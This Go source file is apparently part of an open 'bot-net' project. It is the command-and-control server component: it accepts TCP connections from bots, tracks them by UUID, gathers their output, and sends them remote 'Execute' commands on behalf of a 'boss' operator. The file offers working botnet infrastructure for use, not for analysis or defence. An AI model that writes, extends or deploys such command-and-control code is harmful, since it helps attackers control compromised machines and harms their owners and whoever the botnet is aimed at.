package client

import (
	"bufio"
	"log"
	"net"
	"strconv"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/bot-net/common/cmd"
	"github.com/phanletrunghieu/bot-net/server/domain"
)

// Service struct
type Service struct {
	listener         net.Listener
	Clients          map[uuid.UUID]*domain.Client
	Error            chan error
	ClientResultChan chan string
}

// NewClientService create tcpService struct
func NewClientService(port int) *Service {
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))

	service := &Service{
		listener:         ln,
		Clients:          make(map[uuid.UUID]*domain.Client),
		Error:            make(chan error),
		ClientResultChan: make(chan string),
	}

	if err != nil {
		service.Error <- err
	}

	return service
}

// Run wait for a connection
func (s *Service) Run() {
	s.acceptConnection()
}

func (s *Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error <- err
			continue
		}

		client := &domain.Client{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		s.Clients[client.ID] = client

		go s.handleConnection(client)

		log.Println("Clients:", len(s.Clients))
	}
}

func (s *Service) handleConnection(client *domain.Client) {
	for {
		conn := client.Conn
		// listen for replies
		msg, err := bufio.NewReader(conn).ReadString('\r')
		if err != nil {
			delete(s.Clients, client.ID)
			return
		}

		s.ClientResultChan <- msg
	}
}

// ListClientID list all client id
func (s *Service) ListClientID() []string {
	listIDs := []string{}
	for _, client := range s.Clients {
		listIDs = append(listIDs, client.ID.String())
	}
	return listIDs
}

// SendDataToClient Send data from server to client
func (s *Service) SendDataToClient(client *domain.Client, boss *domain.Boss, msg string) error {
	// 16 byte uuid
	data := append([]byte(cmd.Execute), boss.ID.Bytes()...)
	data = append(data, []byte(msg+"\r")...)
	_, err := client.Conn.Write(data)
	return err
}
